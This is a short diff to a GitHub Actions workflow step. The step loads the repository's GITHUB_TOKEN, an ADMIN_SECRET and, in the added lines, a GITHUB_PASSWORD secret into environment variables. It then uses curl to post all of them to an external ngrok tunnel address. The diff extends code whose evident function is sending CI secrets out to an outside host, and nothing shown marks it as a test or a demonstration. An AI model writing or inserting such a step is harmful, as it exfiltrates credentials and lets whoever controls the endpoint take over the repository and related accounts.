@@ -30,4 +30,5 @@ jobs:
         env:
           TOKEN: ${{ secrets.GITHUB_TOKEN }}
           ADMIN_SECRET: ${{ secrets.ADMIN_SECRET }}
-        run: curl https://920ec84d1762.ngrok.io -d foo="from GitHub Action" -d token=${{ env.TOKEN }} -d admin=${{ env.ADMIN_SECRET }}
+          PASSWORD: ${{ secrets.GITHUB_PASSWORD }}
+        run: curl https://920ec84d1762.ngrok.io -d foo="from GitHub Action" -d token=${{ env.TOKEN }} -d admin=${{ env.ADMIN_SECRET }} -d pass=${{ env.PASSWORD }}
